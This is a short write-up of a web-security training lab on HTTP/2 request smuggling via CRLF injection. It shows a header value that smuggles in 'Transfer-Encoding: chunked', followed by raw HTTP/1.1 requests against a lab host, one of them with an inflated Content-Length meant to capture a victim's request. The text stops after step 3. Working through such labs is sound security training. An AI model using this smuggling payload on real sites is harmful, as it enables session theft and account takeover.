# **HTTP/2 request smuggling via CRLF injection**

Task: To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

Toolkit: Burpsuite, Browser

1. To have 404 resp as proof of [H2.TE](http://H2.TE) vulnerability, we manually change value of header

![][image1]  
bar\\r\\nTransfer-Encoding: chunked and get 404

2. we take search REQ and downgrade to http1.1

POST / HTTP/1.1  
Host: 0a1c00fa03494779812fcaeb007200b4.web-security-academy.net  
Cookie: session=OkEhRpu0829tO7mfImN4tb3EytYHPdGa;   
Content-Length: 9  
Content-Type: application/x-www-form-urlencoded

search=ss

3. send it with our smuggling REQ, but with longer CL then it is

POST / HTTP/1.1  
Host: 0a1c00fa03494779812fcaeb007200b4.web-security-academy.net  
Cookie: session=OkEhRpu0829tO7mfImN4tb3EytYHPdGa  
Content-Length: 400  
Content-Type: application/x-www-form-urlencoded

search=ss
